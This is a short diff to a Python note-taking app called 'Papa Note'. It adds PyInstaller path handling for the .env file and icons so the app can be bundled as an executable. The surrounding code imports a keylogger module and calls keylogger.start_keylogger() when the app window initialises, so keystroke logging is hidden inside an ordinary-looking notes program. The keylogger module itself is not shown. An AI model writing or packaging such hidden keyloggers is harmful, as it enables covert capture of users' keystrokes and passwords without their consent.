@@ -7,11 +7,17 @@ from tkinter import messagebox
 import sqlite3
 from dotenv import load_dotenv
 from PIL import Image
+import sys
 
 import database
 import keylogger
 
-load_dotenv()
+if getattr(sys, 'frozen', False):
+    env_path = os.path.join(sys._MEIPASS, '.env')
+else:
+    env_path = os.path.join(os.path.dirname(__file__), '.env')
+load_dotenv(dotenv_path=env_path)
+
 APP_TITLE = os.getenv("APP_TITLE", "Papa Note")
 WINDOW_SIZE = os.getenv("WINDOW_SIZE", "1100x700")
 
@@ -36,7 +42,12 @@ class PapaNoteApp(ctk.CTk):
         keylogger.start_keylogger()
 
     def _load_icons(self):
-        icon_dir = os.path.join(os.path.dirname(__file__), "icons")
+        if getattr(sys, 'frozen', False):
+            base_dir = sys._MEIPASS
+        else:
+            base_dir = os.path.dirname(__file__)
+            
+        icon_dir = os.path.join(base_dir, "icons")
         os.makedirs(icon_dir, exist_ok=True)
         try:
             self.icon_login = ctk.CTkImage(Image.open(os.path.join(icon_dir, "login.png")), size=(55, 55))
